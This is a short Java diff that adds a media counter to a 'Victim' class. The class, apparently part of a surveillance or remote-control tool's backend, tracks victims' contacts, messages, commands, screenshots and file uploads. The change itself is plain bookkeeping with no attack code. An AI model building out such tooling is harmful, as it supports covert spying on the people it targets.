@@ -25,7 +25,7 @@ public class Victim {
     private final String victimCode;
     private final String relativeLastDeliveryTime;
 
-    private int contactCount, deliveryCount, commandCount, fileBundleCount, messageCount;
+    private int contactCount, deliveryCount, commandCount, fileBundleCount, messageCount, mediaCount;
     private int mediaFileUploadCount;
     private int mediaScreenShotCount;
 
@@ -48,14 +48,18 @@ public class Victim {
         this.relativeLastDeliveryTime = lastDeliveryEpoch > 0 ? TimeUtils.getRelativeTime(false, lastDeliveryEpoch) : null;
     }
 
-    public void setCounts(int contactCount, int deliveryCount, int commandCount, int fileBundleCount, int messageCount) {
+    public void setCounts(int contactCount, int deliveryCount, int commandCount, int fileBundleCount, int messageCount, int mediaCount) {
         this.contactCount = contactCount;
         this.deliveryCount = deliveryCount;
         this.commandCount = commandCount;
         this.fileBundleCount = fileBundleCount;
         this.messageCount = messageCount;
+        this.mediaCount = mediaCount;
     }
 
+    public int getMediaFileCount() {
+        return mediaCount;
+    }
 
     public int getContactCount() {
         return contactCount;
